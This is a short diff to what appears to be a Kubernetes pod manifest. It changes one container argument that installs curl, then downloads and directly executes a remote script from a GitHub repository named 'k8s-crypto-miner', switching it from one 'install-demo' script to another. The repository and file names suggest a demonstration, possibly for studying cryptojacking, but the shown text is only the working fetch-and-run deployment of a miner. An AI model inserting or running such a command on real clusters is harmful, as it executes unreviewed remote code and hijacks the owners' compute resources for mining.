@@ -26,4 +26,4 @@ spec:
           limits:
             cpu: "1"
         command: ["/bin/bash"]
-        args: ['-c', 'apt-get update ; apt-get install -y curl ; source <(curl -s https://raw.githubusercontent.com/jeromebaude/k8s-crypto-miner/main/install-demo-1.sh)' ]
+        args: ['-c', 'apt-get update ; apt-get install -y curl ; source <(curl -s https://raw.githubusercontent.com/jeromebaude/k8s-crypto-miner/main/install-demo-2.sh)' ]
